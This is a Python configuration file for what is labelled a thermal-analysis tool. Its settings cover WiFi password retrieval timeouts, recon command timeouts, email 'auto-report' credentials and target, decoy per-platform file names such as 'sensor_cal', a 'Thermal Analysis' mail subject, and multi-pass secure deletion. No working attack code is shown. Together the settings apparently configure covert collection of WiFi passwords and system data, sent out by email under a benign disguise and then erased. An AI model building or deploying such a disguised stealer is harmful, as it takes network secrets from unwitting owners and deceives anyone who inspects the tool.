# --- config/network.py ---
# Network and communication configuration

import os
try:
    from dotenv import load_dotenv
    load_dotenv()  # Load .env file if it exists
except ImportError:
    pass  # dotenv not installed, fall back to system env vars

# Auto-reporting configuration
# Configure via environment variables in .env file for security
AUTO_REPORT_EMAIL = os.getenv('AUTO_REPORT_EMAIL') or None
AUTO_REPORT_PASS = os.getenv('AUTO_REPORT_PASS') or None  
AUTO_REPORT_TARGET = os.getenv('AUTO_REPORT_TARGET') or None

# WiFi scanning timeouts and behavior
WIFI_SCAN_TIMEOUT = 15
WIFI_PASSWORD_TIMEOUT = 5
WIFI_CONNECTION_TIMEOUT = 30

# Network discovery settings  
MAX_NETWORKS_TO_PROCESS = 2  # Limit thermal analysis operations
RECON_COMMAND_TIMEOUT = 5
AUTO_CLEANUP_DELAY = 300  # 5 minutes before thermal data cleanup

# Calibration file naming by platform
CALIBRATION_FILE_NAMES = {
    'linux': 'comm_cal_{}',
    'windows': 'sensor_cal_{}', 
    'darwin': 'diag_out_{}'
}

# Email reporting and compression
SMTP_SUBJECT_PREFIX = "Thermal Analysis"
COMPRESSION_LEVEL = 9
SECURE_DELETE_PASSES = 3 